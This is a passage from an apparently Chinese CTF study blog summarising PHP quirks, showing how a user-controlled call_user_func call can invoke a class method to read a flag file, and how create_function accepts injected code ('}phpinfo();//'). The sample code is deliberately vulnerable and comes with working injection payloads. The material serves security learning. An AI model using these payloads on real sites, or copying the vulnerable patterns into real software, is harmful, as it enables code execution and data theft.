<h2 id="call-user-func读取类中的函数"><a href="#call-user-func读取类中的函数" class="headerlink" title="call_user_func读取类中的函数"></a>call_user_func读取类中的函数</h2><p>call_user_func函数可以调用类中的函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">say_hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hello!\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$classname</span> = <span class="string">&quot;myclass&quot;</span>;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="keyword">array</span>(<span class="variable">$classname</span>, <span class="string">&#x27;say_hello&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>定义一个类myclass及类方法<code>say_hello</code>,<code>call_user_func()</code>的输入参数变为一个数组，数组第一个元素为对象名、第二个元素为参数</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/20210512112600.png" alt="image-20210512112556095"></p>
<p>example:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myclass</span> </span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这个例子就是一个简单的利用了<code>call_user_func()</code>能够调用类里面的方法，payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[0]&#x3D;myclass&amp;a[1]&#x3D;getFlag</span><br></pre></td></tr></table></figure>
<br/>

<h2 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
<p>从传递的参数创建匿名函数，并为其返回一个唯一的名称。‎</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111&#x27;</span>);</span><br><span class="line">相当于如下：</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以那如果我们这样进行构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return 111;&#125;phpinfo();//&#x27;</span>);</span><br><span class="line">相当于如下：    </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">111</span>;&#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<p><code>phpinfo()</code>便会被执行。</p>
<br/>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/231507#h2-0" >CTF/PHP特性汇总<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：PHP特性总结</li>
        <li>Post author：John_Frod</li>
        <li>Create time：2021-05-12 14:50:55</li>
        <li>
            Post link：https://keep.xpoet.cn/2021/05/12/PHP特性总结/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <div class="article-nav">
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/05/10/2021-Aurora%E5%86%85%E9%83%A8%E8%B5%9B/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">2021 Aurora内部赛</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center" >
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                    
                </main>

            </div>

            <div class="page-main-content-bottom">
                <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span> -
            
            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
        </div>
        
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
        </div>
    </div>
</footer>

            </div>
        </div>
    </main>

    <div class="sidebar-tools">
        <div class="tools-container">
    <ul class="tools-list">
        
            <li class="search popup-trigger">
                <i class="fas fa-search"></i>
            </li>
        

        

        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

    </ul>
</div>

    </div>

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">

    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        <li class="tools-item tool-scroll-to-top flex-center">
            <i class="fas fa-arrow-up"></i>
        </li>

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="tools-ul-1">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

    </ul>
</div>

    </div>

    <!-- page aside -->
    <aside class="page-aside">
        
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93"><span class="nav-text">PHP特性总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hash%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="nav-text">Hash比较缺陷</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MD5"><span class="nav-text">MD5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">md5函数绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#md5%E5%BC%BA%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87"><span class="nav-text">md5强类型绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#intval%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">intval函数绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-match%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">preg_match函数绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#m"><span class="nav-text">&#x2F;m</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%BA%AF%E7%BB%95%E8%BF%87"><span class="nav-text">回溯绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#preg-replace-e-%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">preg_replace &#x2F;e 模式下的代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#in-array%E5%AE%BD%E6%9D%BE%E6%AF%94%E8%BE%83"><span class="nav-text">in_array宽松比较</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">变量覆盖</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#extract%E5%87%BD%E6%95%B0%E3%80%81parse-str%E5%87%BD%E6%95%B0"><span class="nav-text">extract函数、parse_str函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-1"><span class="nav-text">$$变量覆盖</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87"><span class="nav-text">通过数组绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ereg-%E5%87%BD%E6%95%B0"><span class="nav-text">ereg()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strpos-%E5%87%BD%E6%95%B0"><span class="nav-text">strpos()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#strcmp-%E5%87%BD%E6%95%B0"><span class="nav-text">strcmp()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E8%87%AA%E8%BA%AB%E7%89%B9%E6%80%A7"><span class="nav-text">PHP自身特性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E7%9A%84%E5%8F%98%E9%87%8F%E5%90%8D%E6%A0%BC%E5%BC%8F"><span class="nav-text">PHP的变量名格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E6%95%B0%E5%AD%97%E5%8F%AF%E4%B8%8E%E5%AD%97%E7%AC%A6%E5%81%9A%E8%BF%90%E7%AE%97"><span class="nav-text">PHP数字可与字符做运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#escapeshellarg-amp-escapeshellcmd%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">escapeshellarg&amp;escapeshellcmd函数绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellarg"><span class="nav-text">escapeshellarg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellcmd"><span class="nav-text">escapeshellcmd</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#escapeshellarg-amp-escapeshellcmd"><span class="nav-text">escapeshellarg&amp;escapeshellcmd</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E7%B2%BE%E5%BA%A6%E7%BB%95%E8%BF%87%E7%BC%BA%E9%99%B7"><span class="nav-text">PHP精度绕过缺陷</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%AE%E7%82%B9%E8%BF%90%E7%AE%97"><span class="nav-text">浮点运算</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP%E4%B8%AD%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8"><span class="nav-text">PHP中类的运用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass"><span class="nav-text">反射类ReflectionClass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E7%B1%BBException"><span class="nav-text">异常处理类Exception</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BBFilesystemIterator"><span class="nav-text">内置类FilesystemIterator</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proc-self-root%E7%BB%95%E8%BF%87is-file%E5%87%BD%E6%95%B0"><span class="nav-text">&#x2F;proc&#x2F;self&#x2F;root绕过is_file函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gettext-amp-get-defined-vars%E5%87%BD%E6%95%B0"><span class="nav-text">gettext&amp;get_defined_vars函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-tee%E5%91%BD%E4%BB%A4"><span class="nav-text">Linux tee命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%A0%E5%8F%82%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="nav-text">传参变量覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#call-user-func%E8%AF%BB%E5%8F%96%E7%B1%BB%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="nav-text">call_user_func读取类中的函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function%E5%87%BD%E6%95%B0"><span class="nav-text">create_function函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
    </div>
</div>
        
    </aside>

    <!-- image viewer -->
    <div class="image-viewer-container">
    <div class="img-box">
        <img src="">
    </div>
</div>


</div>



    <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-icon">
            <i class="fas fa-search"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="Search..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="popup-btn-close">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>



<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>


    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>




    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>

    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
    

    
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
    


</body>
</html>